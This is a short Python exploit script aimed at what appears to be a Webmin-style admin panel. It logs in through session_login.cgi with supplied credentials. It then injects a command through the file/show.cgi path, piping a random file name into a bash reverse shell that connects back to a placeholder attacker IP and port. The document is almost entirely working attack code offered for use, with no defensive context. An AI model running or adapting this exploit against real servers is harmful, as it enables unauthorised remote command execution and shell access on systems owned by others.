#!/bin/python3
#Requirements: python libaries:requests, others are default
import requests
import sys
import string, secrets

if len(sys.argv) < 2:
    print("Usage:  <python>   <program>  <url> <username> <password>")
def rand():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar
payload = f"bash -c 'exec bash -i >& /dev/tcp/MYIP/PORT 0>&1'"
data = {
   'page': "%2F",
   'user': sys.argv[2].strip("\n"),
   'pass': sys.argv[3].strip("\n")
}
cookiee = {
  "testing": "1"
}
url = sys.argv[1].strip("\n")
resp = requests.post(url + "/session_login.cgi", data=data, cookies=cookiee, verify=False, allow_redirects=False)
sta = resp.status_code
cookies = resp.cookies
if sta == 302 and cookies["sid"] != None:
     print("Logged in")
else:
     print("Wrong Username/Password... Alzheimer or shitty recon?")
     exit()
sid = cookies["sid"]
cookiee = {
  'sid': sid
}
url = url + f"/file/show.cgi/bin/{rand()}|{payload}|"
resp = requests.post(url, cookies=cookiee)
debug = False
if debug:
   print(resp.text)
   print(resp.headers)
print("Executed!")
